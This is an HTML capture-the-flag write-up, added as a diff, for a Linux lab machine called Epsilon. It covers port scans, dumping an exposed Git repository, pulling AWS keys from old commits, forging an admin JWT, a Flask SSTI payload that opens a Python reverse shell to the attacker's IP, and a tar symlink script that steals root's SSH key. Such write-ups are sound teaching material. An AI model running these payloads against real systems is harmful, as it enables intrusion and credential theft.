@@ -1,0 +1,207 @@
+<!--
+  REGLAS DE FORMATO:
+
+  1. Usar <code> solo para mostrar comandos, salidas literales o valores exactos.
+     NO usar <code> en “Key steps”, Overview ni en descripciones explicativas.
+     URLs, rutas o nombres de archivos se resaltan con **negrita** o cursiva.
+
+  2. Para listados completos, salidas de comandos o directorios:
+     Agrupar todo dentro de <pre><code> ... </code></pre>, no múltiples <code> en <li>.
+
+  3. Cada bloque de “Key steps” debe ser texto simple, sin <code> en acciones, excepto comandos exactos.
+
+  4. Imágenes o capturas van con <img src="..." alt="..."> y texto descriptivo.
+-->
+
+<h2>Overview</h2>
+<p>Epsilon is a medium-difficulty Linux machine that exposes a Git repository on the web server. During enumeration, AWS Lambda credentials leaked in previous commits are discovered. Using these credentials, we obtain the secret key used to sign JWTs in the Flask application, allowing us to generate admin cookies and access protected routes. Finally, root access is obtained by exploiting a cronjob that runs <strong>tar -h</strong>, allowing critical files to be replaced via symbolic links.</p>
+
+<h2>Key steps</h2>
+<ol>
+  <li>Full port scan with nmap.</li>
+  <li>Detailed scanning of open ports to identify services and versions.</li>
+  <li>Enumeration of the web application and downloading the Git repository.</li>
+  <li>Review of old commits to extract AWS Lambda credentials.</li>
+  <li>Generation of an admin JWT token to access protected routes.</li>
+  <li>Exploitation of SSTI in Flask to obtain an initial shell.</li>
+  <li>Privilege escalation using a cronjob with tar -h and symbolic links.</li>
+</ol>
+
+<h3>1. Port enumeration</h3>
+<p>First, we identify the services exposed on the target machine. A SYN scan of all TCP ports is performed:</p>
+
+<pre><code>sudo nmap -p- -sS --open --min-rate 5000 -n -vvv 10.10.11.134 -oN allPorts</code></pre>
+
+<p><strong>Results:</strong></p>
+
+<pre><code>PORT     STATE  SERVICE
+22/tcp   open   ssh
+80/tcp   open   http
+5000/tcp open   upnp</code></pre>
+
+<p>Next, a more detailed scan of the open ports is done to identify versions and services:</p>
+
+<pre><code>sudo nmap -p22,80,5000 -sCV -n -vvv 10.10.11.134 -oN infoPorts</code></pre>
+
+<p><strong>Results with version detection (a .git repository is found):</strong></p>
+
+<pre><code>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-title: 403 Forbidden
+|_http-git: Git repository found at /.git/
+5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title: Costume Shop</code></pre>
+
+<h3>2. HTTP enumeration and Git repository dump</h3>
+<p>Visiting <strong>http://10.10.11.134</strong> returns a 403. We check if the Git repository is exposed at <strong>/.git</strong> using gitdumper:</p>
+
+<pre><code>./gitdumper.sh http://10.10.11.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo</code></pre>
+
+<h4>Files obtained from the Git dump</h4>
+<p>The Git dump includes the following important files and folders:</p>
+
+<pre><code>.git/
+HEAD
+config
+COMMIT_EDITMSG
+index
+refs/heads/master
+logs/HEAD
+logs/refs/heads/master
+objects/*</code></pre>
+
+<p>The gitdumper log (cleaned up for readability) looks like this:</p>
+
+<pre><code>[*] Destination folder does not exist
+[+] Creating /home/g3kzzz/CTF/Epsilon/loot/epsilon-repo/.git/
+[+] Downloaded: HEAD
+[-] Downloaded: objects/info/packs
+[+] Downloaded: description
+[+] Downloaded: config
+[+] Downloaded: COMMIT_EDITMSG
+[+] Downloaded: index
+[-] Downloaded: packed-refs
+[+] Downloaded: refs/heads/master
+[-] Downloaded: refs/remotes/origin/HEAD
+[-] Downloaded: refs/stash
+[+] Downloaded: logs/HEAD
+[+] Downloaded: logs/refs/heads/master
+[-] Downloaded: logs/refs/remotes/origin/HEAD
+[-] Downloaded: info/refs
+[+] Downloaded: info/exclude
+[-] Downloaded: /refs/wip/index/refs/heads/master
+[-] Downloaded: /refs/wip/wtree/refs/heads/master
+[+] Downloaded: objects/c6/22771686bd74c16ece91193d29f85b5f9ffa91
+...
+[+] Downloaded: objects/54/5f6fe2204336c1ea21720cbaa47572eb566e34</code></pre>
+
+<h4>Review of old commits</h4>
+<p>The current files do not reveal credentials, so we check previous commits:</p>
+
+<pre><code>cd ~/CTF/Epsilon/loot/epsilon-repo
+git log --oneline --graph --all
+git log -p > ../commits_diff.txt
+cat ../commits_diff.txt</code></pre>
+
+<p>AWS Lambda credentials are found in an old commit:</p>
+
+<pre><code>@@ -8,8 +8,8 @@ session = Session(
+-     aws_access_key_id='<aws_access_key_id>',
+-     aws_secret_access_key='<aws_secret_access_key>',
++     aws_access_key_id='AQLA5M37BDN6FJP76TDC',
++     aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+      region_name='us-east-1',
+      endpoint_url='http://cloud.epsilon.htb'
+)</code></pre>
+
+<h3>3. AWS Lambda enumeration</h3>
+<p>We configure the AWS CLI with the obtained credentials:</p>
+
+<pre><code>aws configure
+# aws_access_key_id and aws_secret_access_key
+# region: us-east-1</code></pre>
+
+<p>List Lambda functions and download the code:</p>
+
+<pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions
+aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
+wget http://cloud.epsilon.htb/path/to/code.zip
+unzip code.zip
+cat lambda_function.py</code></pre>
+
+<p>The <strong>secret key</strong> used to sign JWTs is found.</p>
+
+<h3>4. Exploitation and initial access</h3>
+<p>We generate an admin JWT using PyJWT:</p>
+
+<pre><code>import jwt
+secret = 'VALUE_EXTRACTED_FROM_LAMBDA'
+token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
+print(token)</code></pre>
+
+<p>We place this token in the auth cookie to access admin routes:</p>
+
+<pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.11.134/home</code></pre>
+
+<p>The same cookie works for <strong>http://epsilon.htb:5000/home</strong>:</p>
+<img src="writeups/img/epsilon/img3.png" alt="Home inside the platform">
+<p>The bypass is visually confirmed:</p>
+<img src="writeups/img/epsilon/img4.png" alt="Authenticated home view">
+
+<h4>SSTI in Flask</h4>
+<p>On <strong>/order</strong>, fields are evaluated with <strong>render_template_string</strong>, allowing SSTI. We test:</p>
+
+<pre><code>{{ 3*3 }}</code></pre>
+
+<p><strong>9</strong> is returned, confirming the vulnerability:</p>
+<img src="writeups/img/epsilon/img5.png" alt="SSTI test">
+
+<p>For a reverse shell:</p>
+
+<pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.14.36\',6969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'/bin/bash\')"').read() }}</code></pre>
+
+<p>We obtain a shell and the first flag (user.txt):</p>
+<img src="writeups/img/epsilon/img6.png" alt="First flag obtained">
+
+<h3>5. Privilege escalation</h3>
+<p>Using pspy, we find a cronjob that runs <strong>tar -h</strong> every 5 seconds:</p>
+
+<pre><code>#!/bin/bash
+file=`date +%N`
+/usr/bin/rm -rf /opt/backups/*
+/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
+sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
+sleep 5
+check_file=`date +%N`
+/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
+/usr/bin/rm -rf /opt/backups/*</code></pre>
+
+<p>We abuse -h to replace critical files using symbolic links:</p>
+
+<pre><code>#!/bin/bash
+while true; do 
+    if [ -e /opt/backups/checksum ]; then 
+        rm -f /opt/backups/checksum
+        ln -s -f /root/.ssh/id_rsa /opt/backups/checksum 
+        break
+    fi; 
+done</code></pre>
+
+<p>When the cronjob archives again with -h, root's private key is copied to an accessible location.</p>
+
+<p>Example of extracting id_rsa:</p>
+
+<pre><code>cd /tmp
+./root.sh
+cd /var/backups/web_backups
+cp 503891800.tar /tmp
+cd /tmp
+tar -xf 503891800.tar
+cd opt/backups
+cat checksum  # Contains id_rsa</code></pre>
+
+<p>Finally, we SSH as root:</p>
+
+<pre><code>ssh -i id_rsa root@10.10.11.134</code></pre>
+
+<p>Full access to the Epsilon machine is obtained.</p>
